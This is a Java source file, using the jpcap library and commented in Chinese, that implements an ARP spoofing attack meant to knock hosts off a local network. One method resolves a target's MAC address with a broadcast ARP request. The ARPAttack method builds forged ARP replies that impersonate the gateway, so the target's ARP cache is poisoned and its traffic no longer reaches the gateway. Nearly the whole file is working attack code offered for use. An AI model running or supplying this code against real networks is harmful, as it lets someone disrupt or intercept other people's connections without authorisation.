package ARPAttack;

import java.io.IOException;
import java.net.InetAddress;
import java.util.Arrays;

import javax.swing.JOptionPane;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;
 
public class ARPAttack {
    
        /**
        * 通过发送ARP请求包来获取某一IP地址主机的MAC地址。
        * @param ip //未知MAC地址主机的IP地址
        * @return //已知IP地址的MAC地址
        * @throws IOException
        */
        public static byte[] getOtherMAC(String GatewayMAC,String ip,NetworkInterface device) throws IOException{
                JpcapCaptor jc = JpcapCaptor.openDevice(device,2000,false,3000); //打开网络设备，用来侦听
                
                JpcapSender sender = jc.getJpcapSenderInstance(); //发送器JpcapSender，用来发送报文
          //      InetAddress senderIP = InetAddress.getByName("10.96.33.232"); //(本地局域网)设置本地主机的IP地址，方便接收对方返回的报文
                InetAddress senderIP = InetAddress.getLocalHost();
                InetAddress targetIP = InetAddress.getByName(ip); //目标主机的IP地址
    
                ARPPacket arp=new ARPPacket(); //开始构造一个ARP包
                arp.hardtype=ARPPacket.HARDTYPE_ETHER; //硬件类型（以太网）
                arp.prototype=ARPPacket.PROTOTYPE_IP; //协议类型（IP）
                arp.operation=ARPPacket.ARP_REQUEST; //指明是ARP请求包
                arp.hlen=6; //物理地址长度
                arp.plen=4; //协议地址长度
                arp.sender_hardaddr=device.mac_address; //ARP包的发送端以太网地址,在这里即本地主机地址
                arp.sender_protoaddr=senderIP.getAddress(); //发送端IP地址, 在这里即本地IP地址
    
                byte[] broadcast=new byte[]{(byte)255,(byte)255,(byte)255,(byte)255,(byte)255,(byte)255}; //广播地址
                arp.target_hardaddr=broadcast; //设置目的端的以太网地址为广播地址
                arp.target_protoaddr=targetIP.getAddress(); //目的端IP地址
    
                //构造以太帧首部
                EthernetPacket ether=new EthernetPacket();
                ether.frametype=EthernetPacket.ETHERTYPE_ARP; //帧类型
                ether.src_mac=device.mac_address; //源MAC地址
                ether.dst_mac=broadcast; //以太网目的地址，广播地址
                arp.datalink=ether; //将arp报文的数据链路层的帧设置为刚刚构造的以太帧赋给
    
                sender.sendPacket(arp); //发送ARP报文
              //获取ARP回复包，从中提取出目的主机的MAC地址
             //如果返回的是网关地址，表明目的IP不是局域网内的地址 
                long startTime = System.currentTimeMillis();
                while(true){ 
                	if(System.currentTimeMillis()-startTime>10000)
                	{
                		return null;
                	}
                            
                	Packet packet = jc.getPacket();
                        if(packet instanceof ARPPacket){
                        	ARPPacket p=(ARPPacket)packet;                                 
                                    if(p==null){
                                    	jc.close();
                                       return null;
                                     }
                                    if(Arrays.equals(p.target_protoaddr,senderIP.getAddress())){                               
                                    		 if(Arrays.equals(p.sender_hardaddr,stomac(GatewayMAC))) {
                                    		 //攻击失败
                                    		 jc.close();
                                             return null;
                                           }
                                    		 
                                    		 System.err.println(p.getSenderProtocolAddress());
                                    	 	jc.close();
                                            return p.sender_hardaddr; //返回
                                    }
                        }
                }
        }
    
        /**
        * 将字符串形式的MAC地址转换成存放在byte数组内的MAC地址
        * @param str 字符串形式的MAC地址，如：AA-AA-AA-AA-AA
        * @return 保存在byte数组内的MAC地址
        */
        public static byte[] stomac(String str) {
                byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
                String[] temp = str.split(":");
                for (int i = 0; i < temp.length; i++) {
                        mac[i] = (byte) ((Integer.parseInt(temp[i], 16)) & 0xff);//转换为十六进制int时，保持二进制补码机制
                }
                return mac;
        }
    
        /**
        * 							执行ARP断网攻击。
        * 原理是：冒充网关发送出来的ARP应答包
        * 				   令接收端更改其ARP缓存表，修改网关IP地址对应的MAC地址，
        * 				   从而令数据无法正常通过网关发出。
        * @param ip
        * @param time
        * @throws InterruptedException
        * @throws IOException
        */
        public static ARPPacket ARPAttack(String GatewayIP,String GatewayMAC,String ip,int macFlag,NetworkInterface device) throws InterruptedException, IOException{

                ARPPacket arp = new ARPPacket();
                arp.hardtype = ARPPacket.HARDTYPE_ETHER;//硬件类型
                arp.prototype = ARPPacket.PROTOTYPE_IP; //协议类型
                arp.operation = ARPPacket.ARP_REPLY; //指明是ARP应答包包
                arp.hlen = 6;
                arp.plen = 4;
                
                byte[] srcmac; // 伪装的MAC地址，这里乱写就行，不过要符合格式、十六进制
                if(macFlag==0)
                {
                	srcmac = device.mac_address;//本机MAC
                			
                }else if (macFlag==1) {
                	srcmac = stomac("00:0D:2B:2E:A1:0A");
				}else {
					srcmac = stomac("00:0D:2B:2E:B1:0A");
				}
               
                arp.sender_hardaddr = srcmac;
                arp.sender_protoaddr = InetAddress.getByName(GatewayIP).getAddress();
          
    
               byte[] dst_mac =  getOtherMAC(GatewayMAC,ip,device);
                if(dst_mac==null)
                	return null;
                
                arp.target_hardaddr=dst_mac;
                arp.target_protoaddr=InetAddress.getByName(ip).getAddress();
    
                //设置数据链路层的帧
                EthernetPacket ether=new EthernetPacket();
                ether.frametype=EthernetPacket.ETHERTYPE_ARP;
                ether.src_mac= srcmac; //停止攻击一段时间后，目标主机会自动恢复网络。若要主动恢复，这里可用getOtherMAC("10.96.0.1");
                ether.dst_mac=dst_mac;
                arp.datalink=ether;
                
                return arp;
    
   
        }
        

    
  
}